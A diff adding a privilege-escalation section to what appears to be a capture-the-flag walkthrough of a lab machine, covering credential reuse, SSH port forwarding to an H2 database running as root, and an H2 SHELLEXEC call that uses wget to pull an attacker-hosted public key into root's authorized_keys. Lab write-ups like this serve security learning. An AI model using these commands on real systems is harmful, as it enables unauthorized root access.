@@ -296,6 +296,89 @@ https://seclists.org/fulldisclosure/2019/Apr/24
  
  ![image](https://user-images.githubusercontent.com/123066149/230100868-6a831a4e-8df6-4d08-9708-33e2493c0b8a.png)
 
+# ${{\color{green}Service Running : As ROOT }}\ $
+
+### I found a usable database password for a user in ssh
+
+![image](https://user-images.githubusercontent.com/123066149/230892915-e78bcace-86fb-447e-9cdd-5f3af511fedf.png)
+
+### We have a python shell :
+
+![image](https://user-images.githubusercontent.com/123066149/230893148-5b5b3e46-0256-4b7d-a0ce-4a1e31bf8530.png)
+
+### Spawn a shell :
+
+``import pty``
+
+``pty.spawn("/bin/bash")``
+
+![image](https://user-images.githubusercontent.com/123066149/230893408-b80e3599-7ae9-4925-a663-58e4d1b85f1c.png)
+
+### Was we can see this program have the root privilège :
+
+![image](https://user-images.githubusercontent.com/123066149/230893535-91aeaf9e-6efa-4de8-90b8-99b9a961666b.png)
+![image](https://user-images.githubusercontent.com/123066149/230893574-7197f782-c096-4c5b-b784-92a73bf6072c.png)
+
+``netstat -antp``
+
+![image](https://user-images.githubusercontent.com/123066149/230893739-d42f3312-9667-4a1c-be8d-3da498599adf.png)
+
+### We can redirect this port in the local machine with ssh:
+
+``ssh -L 127.0.0.1:4444:127.0.0.1:8082 daniel@10.10.10.102``
+
+![image](https://user-images.githubusercontent.com/123066149/230893850-f5a6fe34-b5b6-4fe4-b3c3-a0a85038c7d1.png)
+
+![image](https://user-images.githubusercontent.com/123066149/230893909-54756edb-3d7c-4892-80a3-805d545e3373.png)
+
+### I connect to the database with the creds I found before :
+
+![image](https://user-images.githubusercontent.com/123066149/230894137-51516348-5fe4-4308-b157-e95fb7c51444.png)
+
+``searchsploit H2 database``
+
+![image](https://user-images.githubusercontent.com/123066149/230894231-840b1713-2e28-4e28-b836-14b1c0b1f14a.png)
+
+### Finding a blog post in the exploit :
+
+![image](https://user-images.githubusercontent.com/123066149/230894288-487080f4-7e89-48f1-9208-0e11f68e6b62.png)
+
+https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
+
+![image](https://user-images.githubusercontent.com/123066149/230894349-a7c32be7-c966-42e0-b372-74f15ebac9e3.png)
+
+![image](https://user-images.githubusercontent.com/123066149/230894599-6b06c4a7-398e-494e-8816-7d926a83c6ea.png)
+
+### I actually had a surprisingly difficult time going from this code execution to a shell. I tried the standard reverse shells, but none seemed to work
+
+``ssh-keygen``
+
+![image](https://user-images.githubusercontent.com/123066149/230894932-5e96a022-d70c-4783-ad4b-60c96d940828.png)
+
+``cat id_rsa.pub > authorized_keys``
+
+``cat authorized_keys ``
+
+![image](https://user-images.githubusercontent.com/123066149/230895081-f34a9267-78c6-419c-ba05-a5e2697d7a60.png)
+
+``CALL SHELLEXEC('wget -O /root/.ssh/authorized_keys http://10.10.14.10:80/id_rsa.pub')``
+
+![image](https://user-images.githubusercontent.com/123066149/230895262-2f8acb6c-de52-4770-a41c-d6b1d32034bb.png)
+
+``python2.7 -m SimpleHTTPServer 80``
+
+![image](https://user-images.githubusercontent.com/123066149/230895149-5327d4c4-9889-4b5f-a56e-56d9057956fd.png)
+
+``chmod 600 id_rsa``
+
+``ssh -i ssh/id_rsa root@10.10.10.102``
+
+![image](https://user-images.githubusercontent.com/123066149/230895439-2bdf8fc0-c890-494c-b292-6788a882808e.png)
+
+### Enter passphrase created during sshkeygen :
+
+![image](https://user-images.githubusercontent.com/123066149/230895586-09fb2e0b-7f46-4eb0-9888-9e45f6bd8f08.png)
+
 
 # ${{\color{green}GIT : git}}\ $
 
